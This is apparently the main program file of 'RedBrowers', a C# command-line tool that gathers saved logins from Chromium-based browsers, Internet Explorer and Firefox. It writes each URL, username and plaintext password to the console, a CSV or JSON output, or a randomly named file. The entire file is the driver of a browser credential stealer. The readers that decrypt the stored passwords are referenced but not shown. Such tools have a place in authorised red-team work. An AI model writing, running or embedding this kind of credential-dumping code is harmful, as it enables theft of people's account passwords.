using Json.Net;
using RedBrowers.Browsers;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace RedBrowers
{
    internal class Program
    {
        static string[] Args = new string[] {"/stdout","/csv","/json","/file:"};
        static void Main(string[] args)
        {

            bool IsAcceptedArg =  args.Any(x => !Args.Any(y=>x.StartsWith(y)));

            if (IsAcceptedArg) 
            {
                Console.WriteLine("Usage :");
                Console.WriteLine("   .\\RedBrowers.exe arg0 arg1 arg2 ...\n");


                Console.WriteLine("Arguments :\n");
                Console.WriteLine("        - /stdout:   Prints the output to Console");
                Console.WriteLine("        - /csv   :   Returns the output in csv format");
                Console.WriteLine("        - /json  :   Returns the output in json format");
                Console.WriteLine("        - /file  :   File path to write the output if not specified random file in the current dir will be used\n");
                return;
            }
            bool IsStdout = false;
            bool IsCsv = false;
            bool IsJson = false;
            string filename = string.Empty;
            foreach (string arg in args) 
            {
                if (arg == "/stdout")
                {
                    IsStdout = true;
                }
                else if (arg == "/csv") 
                {
                    IsCsv = true;
                }
                else if (arg == "/json")
                {
                    IsJson = true;
                }
                else if (arg.StartsWith("/file:")) 
                {
                    filename = arg.Remove(0, 6);
                }
            }
            if (IsCsv && IsJson) 
            {
                Console.WriteLine("Please Select Only one Format");
                return;
            }
            if (string.IsNullOrEmpty(filename)) 
            {
                filename = Guid.NewGuid().ToString();
            }

         

            //Get Chromium Base Browsers Logins

            List<Login> logins = new ChromiumLoginsReader().ReadLogins();


            //Add InternetExplorer Logins
            logins.AddRange(new InternetExplorerLoginsReader().ReadLogins());

            //Add Firefox Logins
            logins.AddRange(new FirefoxLoginsReader().ReadLogins());


            string returnText = string.Empty;
            
            if (!IsCsv && !IsJson)
            {
                returnText = string.Join("", logins);
            }

            if (IsCsv) 
            {
                returnText = string.Join("\n", logins.Select(x=> $"{x.Url},{x.Username},{x.Password},{x.Browser}"));
            }
            if (IsJson)
            {
                returnText = JsonNet.Serialize(logins);
            }


            if (IsStdout)
            {
                Console.WriteLine(returnText);
            }
            else
            {
                File.WriteAllText(filename, returnText);
                Console.WriteLine($"Logins dumped into : {filename}");
            }
        }
    }
}
